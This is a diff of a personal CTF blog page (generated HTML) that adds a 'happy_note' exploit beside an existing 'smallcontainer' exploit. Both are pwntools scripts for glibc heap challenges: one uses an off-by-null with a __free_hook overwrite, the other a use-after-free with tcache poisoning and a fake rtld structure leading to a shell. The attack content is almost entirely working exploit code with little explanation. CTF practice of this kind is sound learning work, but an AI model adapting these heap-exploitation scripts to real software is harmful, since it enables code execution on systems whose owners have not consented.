@@ -45,7 +45,7 @@
         content="2022-08-21">
       <meta 
         property="og:article:modified_time" 
-        content="2022-08-21">
+        content="2022-08-24">
       <meta 
         property="og:article:author" 
         content="幽林">
@@ -289,7 +289,7 @@
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>11</span>
+    <span>12</span>
     <span>Posts</span>
   </a>
   <a 
@@ -318,7 +318,7 @@
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gift"><span class="toc-text">Gift</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smallcontainer"><span class="toc-text">smallcontainer</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gift"><span class="toc-text">Gift</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smallcontainer"><span class="toc-text">smallcontainer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#happy-note"><span class="toc-text">happy_note</span></a></li></ol>
       </div>
     </article>
   
@@ -373,7 +373,7 @@
     
     
       <span class="dot"></span>
-      <span>675 words</span>
+      <span>1.1k words</span>
     
   </div>
   
@@ -388,6 +388,9 @@
 <h1 id="smallcontainer"><a href="#smallcontainer" class="headerlink" title="smallcontainer"></a>smallcontainer</h1><p>存在一个off by null</p>
 <p>exp：</p>
 <pre class="highlight"><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./smallcontainer&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b&quot;Input size: &quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b&quot;Input index: &quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b&quot;Input index: &quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b&quot;Input index: &quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(0x1f8)#0</span><br><span class="line">add(0x110)#1</span><br><span class="line">add(0x110)#2</span><br><span class="line">for i in range(8):#3-10</span><br><span class="line">    add(0x1f8)</span><br><span class="line"></span><br><span class="line">for j in range(3,10):</span><br><span class="line">    delete(j)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(0x208)#0</span><br><span class="line">add(0x208)#3</span><br><span class="line">add(0x218)#4</span><br><span class="line"></span><br><span class="line">edit(10,b&#x27;a&#x27;*0x1f8)#这里是off by null讲堆块0的inuse位改为0</span><br><span class="line">edit(10,b&#x27;a&#x27;*0x1f0+p64(0x1440))#这里才是修改prevsize造成向后合并</span><br><span class="line">edit(0,b&#x27;a&#x27;*0x1f0+p64(0)+p64(0x221))#恢复堆块结构</span><br><span class="line">delete(0)#将堆块都合并成了一个unsorted bin</span><br><span class="line">for k in range(7):#5-9,11,12</span><br><span class="line">    add(0x1f8)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x1f8)#2</span><br><span class="line">show(1)</span><br><span class="line">libc_base = int(io.recv(12),16)-96-0x10-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">free_hook = libc_base+libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line"></span><br><span class="line">add(0x1f8)#12</span><br><span class="line">edit(12,b&#x27;a&#x27;*0x110+p64(0)+p64(0x121)+p64(free_hook))</span><br><span class="line">add(0x110)#13</span><br><span class="line">add(0x110)#14</span><br><span class="line">one_gadget = libc_base+0x4f302</span><br><span class="line">edit(14,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base: &quot;+hex(libc_base))</span><br><span class="line"># gdb.attach(r)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre>
+
+<h1 id="happy-note"><a href="#happy-note" class="headerlink" title="happy_note"></a>happy_note</h1><p>exp:</p>
+<pre class="highlight"><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./happy_note&#x27;)</span><br><span class="line">#libc = ELF(&#x27;/home/youlin/tools/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx,size,choice):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b&quot;Note size:&quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Choose a mode: [1] or [2]&quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Edit your content:&quot;)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b&quot;Which one do you want to show?&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def UAF(idx):</span><br><span class="line">    menu(666)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):#0-8</span><br><span class="line">    add(i,0x200,1)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">UAF(7)#7</span><br><span class="line">show(7)</span><br><span class="line">libcbase = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x219cc0</span><br><span class="line">rtld = libcbase + 0x25f040</span><br><span class="line">setcontext = libcbase + libc.sym[&#x27;setcontext&#x27;] + 61</span><br><span class="line">sys_addr = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">sh = libcbase + libc.search(b&#x27;/bin/sh&#x27;).__next__()</span><br><span class="line">ret = libcbase + 0x28a87</span><br><span class="line">l_next = libcbase + 0x228010</span><br><span class="line">padding = libcbase + 0x218bc0</span><br><span class="line">pop_rdi = libcbase + 0x2a6c5</span><br><span class="line">add(0,0x10,1)#0</span><br><span class="line">add(1,0x1e0,1)#1</span><br><span class="line">add(2,0x1e0,1)#2</span><br><span class="line">add(3,0x1e0,1)#3</span><br><span class="line">delete(0)</span><br><span class="line">show(7)</span><br><span class="line">io.recvuntil(b&#x27;content: &#x27;)</span><br><span class="line">key = u64(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b&#x27;\0&#x27;))-1</span><br><span class="line">heapbase = key&lt;&lt;12</span><br><span class="line">fake_rtld = heapbase + 0x1120</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">edit(7,b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x1f1) + p64(l_next ^ (key + 1)))</span><br><span class="line">add(4,0x1e8,2)</span><br><span class="line">add(5,0x1e8,2)</span><br><span class="line">edit(5,p64(padding) + p64(fake_rtld))</span><br><span class="line"></span><br><span class="line">one = [0xeacec, 0xeacef, 0xeacf2]</span><br><span class="line"></span><br><span class="line">ogg = libcbase + one[0]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x00&#x27; * 0x18</span><br><span class="line">payload += p64(fake_rtld)</span><br><span class="line">payload = payload.ljust(0x38, b&#x27;\x00&#x27;)</span><br><span class="line">payload += p64(fake_rtld + 0x58)</span><br><span class="line">payload += p64(0x8)</span><br><span class="line">payload += p64(ogg)</span><br><span class="line">payload = payload.ljust(0x100, b&#x27;\x00&#x27;)</span><br><span class="line">payload += p64(fake_rtld + 0x40)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(fake_rtld + 0x48)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(4, payload)</span><br><span class="line">edit(8, b&#x27;\x00&#x27; * (0x12c - 0x10) + p8(8))</span><br><span class="line">delete(10)</span><br><span class="line">io.interactive()</span><br></pre>
 
 
   </div>
@@ -419,6 +422,20 @@
 </article>
 <div class="nav">
   
+    <div class="nav-item-prev">
+      <a 
+        href="/2022/08/22/house-of-banana/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">Prev</div>
+          
+            <div class="nav-title">house_of_banana </div>
+          
+        </div>
+      </a>
+    </div>
+  
   
     <div class="nav-item-next">
       <a 
@@ -445,7 +462,7 @@
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gift"><span class="toc-text">Gift</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smallcontainer"><span class="toc-text">smallcontainer</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gift"><span class="toc-text">Gift</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smallcontainer"><span class="toc-text">smallcontainer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#happy-note"><span class="toc-text">happy_note</span></a></li></ol>
 </div>
             </main>
             <aside class="right-column">
@@ -459,7 +476,7 @@
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gift"><span class="toc-text">Gift</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smallcontainer"><span class="toc-text">smallcontainer</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gift"><span class="toc-text">Gift</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smallcontainer"><span class="toc-text">smallcontainer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#happy-note"><span class="toc-text">happy_note</span></a></li></ol>
     </article>
   
   
@@ -474,6 +491,11 @@
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-08-22</div>
+        <a href="/2022/08/22/house-of-banana/"><div class="recent-posts-item-content">house_of_banana</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
         <div class="recent-posts-item-title">2022-08-21</div>
         <a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/"><div class="recent-posts-item-content">巅峰极客复现</div></a>
       </div>
@@ -486,11 +508,6 @@
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2022-08-04</div>
         <a href="/2022/08/04/0ctf-2017-babyheap/"><div class="recent-posts-item-content">0ctf_2017_babyheap</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-08-01</div>
-        <a href="/2022/08/01/io-file/"><div class="recent-posts-item-content">io_file</div></a>
       </div>
     
   </div>
